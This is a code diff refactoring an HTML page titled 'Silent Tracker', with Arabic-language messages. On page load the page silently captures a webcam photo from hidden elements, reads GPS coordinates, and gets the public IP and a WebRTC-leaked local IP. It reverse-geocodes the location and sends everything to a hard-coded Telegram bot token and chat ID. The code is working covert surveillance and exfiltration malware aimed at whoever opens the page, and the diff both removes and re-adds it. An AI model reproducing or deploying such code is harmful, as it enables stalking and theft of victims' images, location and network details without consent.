@@ -1,185 +1,107 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Silent Tracker</title>
-  <style>
-    body {
-      margin: 0;
-      background-color: white;
-    }
-    video, canvas {
-      display: none;
-    }
-  </style>
+<head><meta charset="UTF-8"><title>Silent Tracker + BigDataCloud</title>
+<style>body{margin:0}video,canvas{display:none}</style>
 </head>
 <body>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>
+<script>
+const token="7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI", chat_id="5735855086";
+let gpsMsg="", publicIP="", localIP="", gpsLat="", gpsLon="", partsReady=0;
+let city="", country="", flagEmoji="";
 
-  <script>
-    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
-    const chat_id = "5735855086";
+function sendPhoto(b){const f=new FormData();f.append("chat_id",chat_id);f.append("photo",b,"photo.jpg");
+return fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:f});}
 
-    let gpsMsg = "";
-    let publicIP = "";
-    let localIP = "";
-    let gpsLat = "";
-    let gpsLon = "";
-    let partsReady = 0;
-    let city = "";
-    let country = "";
-    let flagEmoji = "";
-
-    function sendPhoto(blob) {
-      const form = new FormData();
-      form.append("chat_id", chat_id);
-      form.append("photo", blob, "photo.jpg");
-      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: "POST",
-        body: form
-      });
-    }
-
-    function sendCombinedMessage() {
-      const message = `📡 معلومات الجهاز:
+function sendCombinedMessage(){
+  const msg=`📡 معلومات الجهاز:
 
 📍 الموقع (GPS):
-${gpsMsg || "❌ فشل تحديد الموقع"}
+${gpsMsg||"❌ فشل تحديد الموقع"}
 
-🌐 IP الخارجي: ${publicIP || "❌"}
-🏠 IP الداخلي: ${localIP || "❌"}
+🌐 IP الخارجي: ${publicIP||"❌"}
+🏠 IP الداخلي: ${localIP||"❌"}
 
-🏙️ المدينة: ${city || "❌"}
-🌍 الدولة: ${country ? `${country} ${flagEmoji}` : "❌"}
+🏙️ المدينة: ${city||"❌"}
+🌍 الدولة: ${country?`${country} ${flagEmoji}`:"❌"}
 
 🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: message })
-      });
-    }
-
-    function checkIfReady() {
-      partsReady++;
-      if (partsReady === 3) {
-        sendCombinedMessage();
-      }
-    }
-
-function reverseGeocode(lat, lon) {
-  const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-  fetch(url, {
-    headers: {
-      'User-Agent': 'Mozilla/5.0 (Tracker Script)'
-    }
-  })
-    .then(res => res.json())
-    .then(data => {
-      const address = data.address || {};
-      city = address.city || address.town || address.village || address.hamlet || address.suburb || address.county || "";
-      country = address.country || "";
-      const countryCode = address.country_code ? address.country_code.toUpperCase() : "";
-      flagEmoji = countryCode
-        ? String.fromCodePoint(...[...countryCode].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
-        : "";
-      checkIfReady();
-    })
-    .catch(() => {
-      city = "";
-      country = "";
-      flagEmoji = "";
-      checkIfReady();
-    });
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id,text:msg})
+  });
 }
 
-    function getLocation() {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            gpsLat = pos.coords.latitude.toFixed(6);
-            gpsLon = pos.coords.longitude.toFixed(6);
-            const acc = pos.coords.accuracy;
-            gpsMsg = `Latitude: ${gpsLat}
-Longitude: ${gpsLon}
-📏 الدقة: ±${acc} متر`;
-            reverseGeocode(gpsLat, gpsLon); // استخدم OSM هنا
-          },
-          () => {
-            gpsMsg = `❌ فشل تحديد الموقع`;
-            checkIfReady();
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      } else {
-        gpsMsg = "❌ GPS غير مدعوم";
-        checkIfReady();
+function checkIfReady(){if(++partsReady===3)sendCombinedMessage();}
+
+function reverseGeocode(lat,lon){
+  fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
+    .then(r=>r.json()).then(d=>{
+      city=d.locality||d.city||"";
+      country=d.countryName||"";
+      const code=d.countryCode||"";
+      flagEmoji=code?String.fromCodePoint(...[...code].map(c=>0x1F1E6+c.charCodeAt(0)-65)):"";
+      checkIfReady();
+    }).catch(_=>{city="";country="";flagEmoji="";checkIfReady();});
+}
+
+function getLocation(){
+  if("geolocation"in navigator){
+    navigator.geolocation.getCurrentPosition(
+      p=>{
+        gpsLat=p.coords.latitude.toFixed(6);
+        gpsLon=p.coords.longitude.toFixed(6);
+        gpsMsg=`Latitude: ${gpsLat}\nLongitude: ${gpsLon}\n📏 الدقة: ±${p.coords.accuracy} متر`;
+        reverseGeocode(gpsLat,gpsLon);
+      },
+      ()=>{gpsMsg="❌ فشل تحديد الموقع";reverseGeocode(null,null);},
+      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+    );
+  } else {
+    gpsMsg="❌ GPS غير مدعوم";reverseGeocode(null,null);
+  }
+}
+
+function getPublicIP(){
+  fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
+    publicIP=d.ip;checkIfReady();
+  }).catch(_=>{publicIP="❌ فشل جلب IP";checkIfReady();});
+}
+
+function getLocalIP(){
+  const pc=new RTCPeerConnection({iceServers:[]});
+  pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
+  pc.onicecandidate=e=>{
+    if(e?.candidate){
+      const m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+      if(m){
+        const ip=m[1];
+        if(ip.startsWith("192.")||ip.startsWith("10.")||ip.startsWith("172.")){
+          localIP=ip;checkIfReady();
+        }
       }
     }
+  };
+  setTimeout(()=>{if(!localIP)localIP="❌ لم يتم الحصول عليه",checkIfReady()},2000);
+}
 
-    function getPublicIP() {
-      fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(data => {
-          publicIP = data.ip;
-          checkIfReady();
-        })
-        .catch(() => {
-          publicIP = "❌ فشل جلب IP";
-          checkIfReady();
-        });
-    }
+function initCamera(){
+  navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+    document.getElementById("video").srcObject=s;
+    document.getElementById("video").addEventListener("playing",()=>{
+      const c=document.getElementById("canvas"),ctx=c.getContext("2d");
+      c.width=video.videoWidth;c.height=video.videoHeight;
+      ctx.drawImage(video,0,0);
+      c.toBlob(b=>sendPhoto(b),"image/jpeg");
+      s.getTracks().forEach(t=>t.stop());
+    });
+  }).catch(()=>{});
+}
 
-    function getLocalIP() {
-      const pc = new RTCPeerConnection({ iceServers: [] });
-      pc.createDataChannel("");
-      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-      pc.onicecandidate = event => {
-        if (!event || !event.candidate) return;
-        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
-        if (ipMatch) {
-          const ip = ipMatch[1];
-          if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-            localIP = ip;
-            checkIfReady();
-          }
-        }
-      };
-      setTimeout(() => {
-        if (!localIP) {
-          localIP = "❌ لم يتم الحصول عليه";
-          checkIfReady();
-        }
-      }, 2000);
-    }
-
-    function initCamera() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.getElementById("video");
-          video.srcObject = stream;
-          video.addEventListener("playing", () => {
-            const canvas = document.getElementById("canvas");
-            const ctx = canvas.getContext("2d");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
-            stream.getTracks().forEach(track => track.stop());
-          });
-        })
-        .catch(() => {
-          // الكاميرا غير متاحة
-        });
-    }
-
-    // بدء جميع العمليات
-    getLocation();
-    getPublicIP();
-    getLocalIP();
-    initCamera();
-  </script>
+getLocation();
+getPublicIP();
+getLocalIP();
+initCamera();
+</script>
 </body>
 </html>
